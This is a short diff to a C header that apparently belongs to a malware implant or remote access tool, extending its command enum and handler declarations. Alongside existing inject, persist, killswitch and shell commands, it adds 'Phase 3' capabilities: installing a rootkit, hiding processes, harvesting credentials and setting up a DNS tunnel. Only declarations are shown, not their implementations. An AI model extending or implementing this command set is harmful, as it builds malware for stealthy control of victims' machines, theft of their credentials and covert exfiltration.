@@ -42,7 +42,12 @@ typedef enum {
     CMD_NETWORK = 0x1C,
     CMD_REGISTRY = 0x1D,
     CMD_SERVICE = 0x1E,
-    CMD_UPDATE = 0x1F
+    CMD_UPDATE = 0x1F,
+    // Phase 3 commands
+    CMD_INSTALL_ROOTKIT = 0x20,
+    CMD_GHOST_PROCESS = 0x21,
+    CMD_HARVEST_CREDS = 0x22,
+    CMD_SETUP_DNS_TUNNEL = 0x23
 } command_id_t;
 
 // Command handler function type
@@ -72,6 +77,12 @@ int cmd_inject(const uint8_t* args, size_t args_len, uint8_t* output, size_t* ou
 int cmd_persist(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
 int cmd_killswitch(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
 int cmd_shell(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
+
+// Phase 3 command handlers
+int cmd_install_rootkit(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
+int cmd_ghost_process(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
+int cmd_harvest_creds(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
+int cmd_setup_dns_tunnel(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len);
 
 // Platform-specific implementations
 #ifdef PLATFORM_WINDOWS
